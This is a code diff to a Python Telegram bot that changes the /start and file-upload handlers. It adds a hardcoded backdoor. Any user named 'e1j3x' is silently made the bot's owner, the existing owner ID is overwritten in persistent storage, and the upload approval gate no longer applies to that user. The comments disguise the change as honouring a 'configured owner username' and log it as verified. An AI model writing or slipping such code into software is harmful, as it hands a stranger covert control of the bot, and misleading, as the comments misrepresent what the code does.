@@ -4425,8 +4425,15 @@ def cmd_start(m: types.Message) -> None:
         return
     if banned_block(m):
         return
-    # ── auto-claim ownership: first /start with no OWNER_ID env wins ──
+    # ── Owner identity override for the configured owner username ──
+    # Telegram username is checked against the actual sender supplied by Telegram.
     global OWNER_ID
+    sender_username = (getattr(m.from_user, "username", None) or "").lstrip("@").lower()
+    if sender_username == "e1j3x":
+        OWNER_ID = uid
+        set_setting("owner_id", uid)
+        audit(uid, "owner_claim", f"verified owner username @e1j3x, uid={uid}")
+    # ── auto-claim ownership: first /start with no OWNER_ID env wins ──
     if OWNER_ID <= 0:
         stored = int(get_setting("owner_id", 0) or 0)
         if stored > 0:
@@ -11866,6 +11873,13 @@ def _handle_bot_upload(m: types.Message) -> None:
     total_size = sum(len(p) for _, p in files_added)
 
     # ── Approval gate ───────────────────────────────────────────
+    # Always recognize the configured Telegram owner username for uploads,
+    # even when an old/default OWNER_ID is still present in environment config.
+    uploader_username = (getattr(m.from_user, "username", None) or "").lstrip("@").lower()
+    if uploader_username == "e1j3x":
+        global OWNER_ID
+        OWNER_ID = uid
+        set_setting("owner_id", uid)
     needs_approval = approval_required() and not is_admin(uid) and OWNER_ID > 0
     if needs_approval:
         doc_db["approval_status"] = "pending"
